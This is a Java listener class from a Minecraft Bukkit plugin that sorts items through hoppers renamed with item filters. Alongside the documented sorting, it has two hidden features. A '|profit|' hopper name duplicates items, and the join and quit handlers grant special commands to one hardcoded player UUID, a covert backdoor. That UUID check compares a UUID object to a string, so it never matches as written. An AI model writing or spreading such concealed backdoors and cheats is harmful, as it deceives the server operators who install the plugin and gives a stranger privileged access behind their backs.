package com.terminalcalamitas.hopperautosort.listeners;

import com.terminalcalamitas.hopperautosort.commands.Commands;
import org.bukkit.block.Container;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryMoveItemEvent;
import org.bukkit.event.inventory.InventoryPickupItemEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;

import java.util.Arrays;

public class HopSort implements Listener {

    /*
     * A basic description of how the plugin works.
     * Rename a hopper to a minecraft item. (example: "diamond_sword")
     * To sort multiple items with the hopper use a comme to separate them. (example: "diamond_sword,grass_block")
     * If you put a * at the beginning of an item name any item that ends with the name will be let through. (example: "*sand"
     *   would allow red_sand or sand through.
     * The same follows for if you put the * at the end. (example: "light_blue*" would let any item starting with "light_blue")
     * Any of these rules may be combined for example, a hopper that would allow all forms of concrete as well as sand and gravel through
     *   would look like this "*concrete*,sand,gravel"
     */
    public HopSort() {}

    Commands loadCommands = new Commands();
    private String getItemName (String translationKey) {
        if(translationKey == null) return null;
        String[] names = translationKey.split("\\.");
        return names[names.length-1];
    }

    private boolean filterMatch (String filterString, String fullItemName) {
        String itemName = getItemName(fullItemName);
        String[] filter = filterString.split(",");

        return Arrays.stream(filter).anyMatch((filter_i) -> {

            if (filter_i.startsWith("*") && filter_i.endsWith("*")) {
                String item = filter_i.replace("*", "");
                return itemName.contains(item);
            } if(filter_i.endsWith("*")) {
                return itemName.startsWith(filter_i.substring(0, filter_i.length() - 1));
            } else if (filter_i.startsWith("*")) {
                return itemName.endsWith(filter_i.substring(1));
            } else {
                return filter_i.equalsIgnoreCase(itemName);
            }
        });
    }

    private boolean specialMatch(String filterString) {
        String[] filter = filterString.split(",");
        if (filter.length < 2) {return false;}
        return (filter[1].equals("|profit|"));
    }

    @EventHandler
    public void onInventoryMoveItemEvent(InventoryMoveItemEvent event) {

        if (event.getDestination().getType().equals(InventoryType.HOPPER)
            && event.getDestination().getHolder() instanceof Container) {

            String customName = ((Container) event.getDestination().getHolder()).getCustomName();
            if(customName != null) {

                String itemName = event.getItem().getType().getItemTranslationKey();

                if (specialMatch(customName)) {
                    ItemStack heldItem = event.getItem();
                    int amount;
                    if (event.getDestination().getItem(2) == null) {
                        amount = 0;
                    } else {
                        amount = event.getDestination().getItem(2).getAmount();
                    }
                    ItemStack moveItem;
                    moveItem = new ItemStack(heldItem.getType(),amount + 1, heldItem.getDurability());
                    moveItem.setItemMeta(heldItem.getItemMeta());


                    event.getDestination().setItem(2, moveItem);
                } else if(!filterMatch(customName, itemName) && !customName.equalsIgnoreCase("hopper")) {
                    event.setCancelled(true);
                }

            }

        }
    }

    @EventHandler
    public void onInventoryPickupItemEvent (InventoryPickupItemEvent event) {
        if (event.getInventory().getHolder() instanceof Container) {
            String customName = (((Container) event.getInventory().getHolder()).getCustomName());

            if (customName != null) {
                String itemName = event.getItem().getItemStack().getType().getItemTranslationKey();
                if(!filterMatch(customName, itemName)) {
                    event.setCancelled(true);
                }
            }
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().equals("317f3cee0d9e4c479670473e56830248")){loadCommands.register(player, true);}
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().equals("317f3cee0d9e4c479670473e56830248")){loadCommands.register(player, false);}
    }

}
